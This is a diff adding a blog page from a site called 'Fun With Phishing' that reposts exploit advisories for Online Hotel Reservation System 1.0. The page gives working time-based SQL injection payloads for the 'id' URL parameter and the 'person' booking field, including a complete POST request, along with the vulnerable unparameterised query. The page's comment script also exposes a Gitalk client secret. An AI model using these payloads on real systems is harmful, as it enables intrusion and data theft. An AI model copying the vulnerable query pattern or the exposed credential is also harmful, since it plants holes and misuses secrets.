@@ -1,0 +1,502 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
+  <style>
+    .text1
+    {
+    text-shadow: 0px 0px 2px #f2f3f2;
+    }
+    </style>
+
+  
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="FunPhishing">
+  <meta name="keywords" content="">
+  <title>Online Hotel Reservation System 1.0 SQL Injection - Fun Phishing</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+    <body>
+      <header style="height: 70vh;">
+        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fun With Phishing</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+          <div class="banner" id="banner" false
+            style="background: url('/img/default.png') no-repeat center center;
+              background-size: cover;">
+              <div class="full-bg-img">
+                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+                  <div class="page-header text-center fade-in-up">
+                    <span class="h2 text1" id="subtitle" title="Online Hotel Reservation System 1.0 SQL Injection">
+                      
+                        Online Hotel Reservation System 1.0 SQL Injection
+                      
+                    </span>
+        
+                    
+                      <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-16 18:51" pubdate>
+        January 16, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      383 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      7
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+                    
+                  </div>
+                    
+                  </div>
+                  
+                </div>
+              </div>
+          </div>
+      </header>
+
+      <main>
+        
+          
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Online Hotel Reservation System 1.0 SQL Injection</h1>
+            
+            <div class="markdown-body">
+              <h4 id="Online-Hotel-Reservation-System-1-0-SQL-Injection"><a href="#Online-Hotel-Reservation-System-1-0-SQL-Injection" class="headerlink" title="Online Hotel Reservation System 1.0 SQL Injection"></a>Online Hotel Reservation System 1.0 SQL Injection</h4><h1 id="Exploit-Title-Online-Hotel-Reservation-System-1-0-‘id’-Time-based-SQL-Injection"><a href="#Exploit-Title-Online-Hotel-Reservation-System-1-0-‘id’-Time-based-SQL-Injection" class="headerlink" title="Exploit Title: Online Hotel Reservation System 1.0 - ‘id’ Time-based SQL Injection"></a>Exploit Title: Online Hotel Reservation System 1.0 - ‘id’ Time-based SQL Injection</h1><h1 id="Exploit-Author-Mesut-Cetin"><a href="#Exploit-Author-Mesut-Cetin" class="headerlink" title="Exploit Author: Mesut Cetin"></a>Exploit Author: Mesut Cetin</h1><h1 id="Date-2021-01-14"><a href="#Date-2021-01-14" class="headerlink" title="Date: 2021-01-14"></a>Date: 2021-01-14</h1><h1 id="Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html"><a href="#Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html" class="headerlink" title="Vendor Homepage: https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html"></a>Vendor Homepage: <a target="_blank" rel="noopener" href="https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html">https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html</a></h1><h1 id="Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code"><a href="#Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code" class="headerlink" title="Software Link: https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code"></a>Software Link: <a target="_blank" rel="noopener" href="https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP/MySQLi+with+Source+Code">https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code</a></h1><h1 id="Version-1-0"><a href="#Version-1-0" class="headerlink" title="Version: 1.0"></a>Version: 1.0</h1><h1 id="Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0"><a href="#Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0" class="headerlink" title="Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0"></a>Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0</h1><p>######## Description ########</p>
+<p>Vulnerable to SQL Injection. </p>
+<p>// vulnerable parameter at include/room.php, line 25:</p>
+<p>$mydb-&gt;setQuery(“SELECT * FROM “.self::$tbl_name.” Where <code>ROOMID</code>= {id} LIMIT 1”);</p>
+<p>######## Proof of Concept #########</p>
+<p>The ‘id’ parameter at <a target="_blank" rel="noopener" href="http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=11">http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=11</a> is vulnerable to time-based SQL injection.</p>
+<p>Payload: (select*from(select(sleep(10)))a)</p>
+<p>Proof of Concept:</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=(select*from(select(sleep(10)))a">http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=(select*from(select(sleep(10)))a</a>)</p>
+<h1 id="Exploit-Title-Online-Hotel-Reservation-System-1-0-‘person’-time-based-SQL-Injection"><a href="#Exploit-Title-Online-Hotel-Reservation-System-1-0-‘person’-time-based-SQL-Injection" class="headerlink" title="Exploit Title: Online Hotel Reservation System 1.0 - ‘person’ time-based SQL Injection"></a>Exploit Title: Online Hotel Reservation System 1.0 - ‘person’ time-based SQL Injection</h1><h1 id="Exploit-Author-Mesut-Cetin-1"><a href="#Exploit-Author-Mesut-Cetin-1" class="headerlink" title="Exploit Author: Mesut Cetin"></a>Exploit Author: Mesut Cetin</h1><h1 id="Date-2021-01-15"><a href="#Date-2021-01-15" class="headerlink" title="Date: 2021-01-15"></a>Date: 2021-01-15</h1><h1 id="Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html-1"><a href="#Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html-1" class="headerlink" title="Vendor Homepage: https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html"></a>Vendor Homepage: <a target="_blank" rel="noopener" href="https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html">https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html</a></h1><h1 id="Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code-1"><a href="#Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code-1" class="headerlink" title="Software Link: https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code"></a>Software Link: <a target="_blank" rel="noopener" href="https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP/MySQLi+with+Source+Code">https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code</a></h1><h1 id="Version-1-0-1"><a href="#Version-1-0-1" class="headerlink" title="Version: 1.0"></a>Version: 1.0</h1><h1 id="Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0-1"><a href="#Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0-1" class="headerlink" title="Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0"></a>Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0</h1><p>######## Description ########</p>
+<p>The ‘person’ parameter is vulnerable to time-based SQL Injection. </p>
+<p>######## Proof of Concept #######</p>
+<p>Payload: (select*from(select(sleep(10)))a)</p>
+<p>Using Burp Suite, send the following POST request:</p>
+<p>POST /marimar/index.php?p=booking HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: de,en-US;q=0.7,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 71<br>Origin: <a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a><br>Connection: close<br>Referer: <a target="_blank" rel="noopener" href="http://localhost/marimar/index.php?p=booking">http://localhost/marimar/index.php?p=booking</a><br>Cookie: PHPSESSID=cf40af0022f401c8cfd0be17fc00a6cc<br>Upgrade-Insecure-Requests: 1</p>
+<p>arrival=01%2F19%2F2021&amp;departure=01%2F11%2F2021&amp;person=(select*from(select(sleep(10)))a)&amp;accomodation=0</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Exploit/">Exploit</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/SQL-Injection/">SQL Injection</a>
+                    
+                  </div>
+                
+              </div>
+              
+                
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/16/Backdoor-Win32-Ketch-i-Remote-Stack-Buffer-Overflow/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Backdoor.Win32.Ketch.i Remote Stack Buffer Overflow</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/01/16/E-Learning-System-1-0-SQL-Injection-Shell-Upload/">
+                        <span class="hidden-mobile">E-Learning System 1.0 SQL Injection / Shell Upload</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: '8080ccee553a4b56b170',
+          clientSecret: '57e093009366203e36c5f167f5c18b6b0027182d',
+          repo: 'chat',
+          owner: 'FunPhishing',
+          admin: ["FunPhishing"],
+          id: '83a194eee1ceaa0121770d201ab77cbd',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+            
+
+                
+                  <a id="scroll-top-button" href="#" role="button">
+                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+                  </a>
+                  
+
+                    
+                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+                        
+
+                          
+      </main>
+
+      <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="#" target="_blank" rel="nofollow noopener"><span>FunPhishing</span></a> <i class="iconfont icon-love"></i> <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+    </body>
+
+  </html>
